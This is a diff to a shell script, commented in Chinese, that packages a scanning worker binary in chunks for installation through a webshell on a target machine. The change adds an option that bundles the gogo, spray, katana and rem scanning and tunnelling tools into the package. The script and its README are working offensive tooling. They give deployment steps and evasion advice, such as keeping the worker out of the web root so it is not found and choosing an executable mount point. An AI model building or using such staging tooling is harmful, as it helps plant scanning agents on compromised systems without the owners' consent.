@@ -9,9 +9,14 @@
 # 用法：
 #   ./webshell-node-bundle.sh --platform https://zre.example.com --token <节点密钥> \
 #       --name web-01 [--caps subdomain,fingerprint] [--binary /path/to/worker] \
-#       [--proxy socks5://relay:1080] [--out ./bundle-web-01] [--chunk 6]
+#       [--proxy socks5://relay:1080] [--out ./bundle-web-01] [--chunk 6] \
+#       [--with-tools]
 #
 # 不给 --binary 时用 src/backend 现场编译（linux/amd64 静态二进制）。
+# --with-tools 把平台托管工具（src/backend/data/tools/linux/ 下的 gogo/spray/
+# katana/rem，由 toolruntime 维护）打成 tools/<name>.gz.part* 分片随包携带；
+# 不加该参数时，worker 上线后也会通过节点网关按清单自动同步，只是首次任务前
+# 需要等一个心跳周期。
 set -euo pipefail
 
 PLATFORM=""
@@ -23,6 +28,7 @@ OUT=""
 CHUNK_MB=6
 MAX_TASKS=5
 PROXY=""
+WITH_TOOLS="${WITH_TOOLS:-0}"
 
 usage() { sed -n '2,20p' "$0" | sed 's/^# \{0,1\}//'; exit 1; }
 
@@ -37,6 +43,7 @@ while [ $# -gt 0 ]; do
     --chunk)    CHUNK_MB="${2:-}"; shift 2 ;;
     --max-tasks) MAX_TASKS="${2:-}"; shift 2 ;;
     --proxy)    PROXY="${2:-}"; shift 2 ;;
+    --with-tools) WITH_TOOLS=1; shift ;;
     -h|--help)  usage ;;
     *) echo "未知参数: $1" >&2; usage ;;
   esac
@@ -72,6 +79,23 @@ GZ_SHA="$(sha256sum "$WORK/worker.gz" | awk '{print $1}')"
 BIN_SHA="$(sha256sum "$BINARY" | awk '{print $1}')"
 RAW_SHA="$BIN_SHA"
 printf '%s  worker.gz\n' "$GZ_SHA" > "$OUT/worker.sha256"
+
+# --with-tools：把托管工具打进包（tools/<name>.gz.part* + sha256 + 清单）
+TOOL_NAMES=""
+if [ "$WITH_TOOLS" = "1" ]; then
+  TOOLS_DIR="$BACKEND/data/tools/linux"
+  if [ -d "$TOOLS_DIR" ]; then
+    mkdir -p "$OUT/tools"
+    for t in gogo spray katana rem; do
+      [ -f "$TOOLS_DIR/$t" ] || continue
+      gzip -9 -c "$TOOLS_DIR/$t" > "$WORK/$t.gz"
+      ( cd "$WORK" && split -b "${CHUNK_MB}m" -d -a 3 "$t.gz" "$OUT/tools/$t.gz.part" )
+      printf '%s  %s.gz\n' "$(sha256sum "$WORK/$t.gz" | awk '{print $1}')" "$t" > "$OUT/tools/$t.sha256"
+      TOOL_NAMES="$TOOL_NAMES $t"
+    done
+  fi
+  [ -n "$TOOL_NAMES" ] || echo "[with-tools] 平台托管目录没有工具（先在平台上装好 gogo/spray/katana/rem）"
+fi
 
 echo "[3/5] 生成 install.sh / cleanup.sh"
 YAML_CAPS="[$(printf '%s' "$CAPS" | awk -F, '{for(i=1;i<=NF;i++){printf "%s\"%s\"", (i>1?", ":""), $i}}')]"
@@ -121,6 +145,21 @@ if command -v sha256sum >/dev/null 2>&1; then
 fi
 mv worker.tmp worker
 chmod 755 worker
+
+# 可选：恢复随包携带的扫描工具（--with-tools 打包）到 tools/linux/
+if ls tools/*.sha256 >/dev/null 2>&1; then
+  mkdir -p tools/linux
+  for sumf in tools/*.sha256; do
+    tname="\$(basename "\$sumf" .sha256)"
+    if ls "tools/\$tname".gz.part* >/dev/null 2>&1; then
+      cat "tools/\$tname".gz.part* > "tools/\$tname.gz"
+      gzip -dc "tools/\$tname.gz" > "tools/linux/\$tname"
+      chmod 755 "tools/linux/\$tname"
+      rm -f "tools/\$tname.gz"
+      echo "tool ok: \$tname"
+    fi
+  done
+fi
 
 mkdir -p config
 umask 077
@@ -215,8 +254,9 @@ cat > "$OUT/README.txt" <<EOF
 - 不要把 worker 放进 Web 根目录（会被静态托管/被扫到）。
 - 目标机需要可执行挂载点：/tmp 常被 noexec，优先应用目录或 /var/tmp。
 - 任务里不要选「字典」（SubdomainDictID/DirDictID）：worker 不连库，选字典会直接失败。
-- 只有 subdomain / fingerprint 是纯 Go 能力；port_scan 需要 gogo，vuln_scan 需要 nuclei，
-  dir_scan 需要 spray/rad，crawler 需要 katana，缺二进制时对应任务会失败。
+- 扫描工具（gogo/spray/katana/rem）worker 上线后会经节点网关按清单自动同步；
+  打包时加 --with-tools 可随包携带，装完即可跑全量模块。
+  同步完成前：port_scan 有原生 TCP 兜底，dir_scan/crawler/vuln_scan 会因缺二进制失败。
 EOF
 
 echo "[4/5] 分片数: $(ls "$OUT"/worker.gz.part* | wc -l)，压缩后 $(du -h "$WORK/worker.gz" | awk '{print $1}')（原始 $(du -h "$BINARY" | awk '{print $1}')）"
